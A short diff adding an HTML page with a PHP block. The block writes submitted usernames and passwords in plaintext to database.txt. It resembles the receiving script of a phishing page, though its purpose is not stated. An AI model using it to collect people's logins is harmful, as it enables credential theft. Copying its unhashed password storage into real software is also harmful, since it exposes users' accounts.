@@ -1,0 +1,16 @@
+<html>
+<head>
+<title>Database</title>
+</head>
+	
+<body>
+Copied to DataBase Txt File
+	<?php
+		$username = $_POST["username"];
+		$password = $_POST["password"];
+		$file = fopen("database.txt","w+") or die("file not open");
+		fwrite($file,$username."\n".$password);
+		fclose($file);
+	?>
+</body>
+</html>
